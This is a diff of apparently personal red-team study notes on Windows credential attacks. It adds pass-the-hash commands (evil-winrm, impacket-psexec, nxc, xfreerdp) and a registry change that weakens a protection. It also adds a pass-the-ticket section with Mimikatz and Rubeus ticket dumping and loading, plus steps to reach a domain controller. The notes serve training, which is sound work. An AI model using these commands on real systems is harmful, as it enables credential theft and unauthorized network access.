@@ -274,7 +274,9 @@ PS> .\LaZagne.exe all
 
 <div class="row row-cols-lg-2"><div>
 
-#### Pass-the-hash
+#### Pass-the-hash (pth)
+
+[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
 There are some scenarios in which we got hold of a hash, but haven't managed to crack it. We may try to use the hash.
 
@@ -284,7 +286,12 @@ Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> m
 
 ```shell!
 $ evil-winrm -i IP -u username -H "hash" # WinRM protocol
+$ impacket-psexec -hashes :hash username@IP
+$ nxc smb IP/32 -u username -d . -H hash
+$ xfreerdp  /v:IP /u:username /pth:hash
 ```
+
+⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`.
 
 * We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool.
 
@@ -298,6 +305,44 @@ PS> Invoke-WMIExec -Target DC01 -Domain xxx.xxx -Username xxx -Hash xxx -Command
 
 ⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to by-pass this check.
 </div><div>
+
+#### Pass-the-ticket (ptt)
+
+[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+
+Some authentication mechanisms such as [Kerberos](/operating-systems/cloud/active-directory/security/index.md#kerberos) are based on tickets to authorize access to resources. Given a ticket that hasn't expired, we may be able to access interesting resources.
+
+On Windows, an user can only access their tickets, while an admin can access every ticket on the computer.
+
+* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool to dump tickets.
+
+```shell!
+mimikatz# sekurlsa::tickets /export # dump tickets
+CMD> dir *.kirbi
+mimikatz# kerberos::ptt ".\xxx@yyy.kirbi" # load ticket
+```
+
+* We can use [Rubeus](https://github.com/GhostPack/Rubeus) <small>(3.7k ⭐)</small>
+
+```shell!
+PS> .\Rubeus.exe dump /nowrap # Dump tickets
+PS> # Load the ticket in the current session
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
+PS> .\Rubeus.exe ptt /ticket:xxx@yyy.kirbi
+PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
+PS> # Pass the Key / OverPass the Hash
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
+```
+
+**What's next? 🐼** According to the ticket that was loaded, you may be able to run commands that you couldn't before. For instance:
+
+```shell!
+PS> dir \\DC01.xxx.yyy\c$
+PS> dir \\DC01.xxx.yyy\some_user_share
+PS> dir \\DC01\some_user_share
+PS> Enter-PSSession -ComputerName DC01
+```
 </div></div>
 
 <hr class="sep-both">
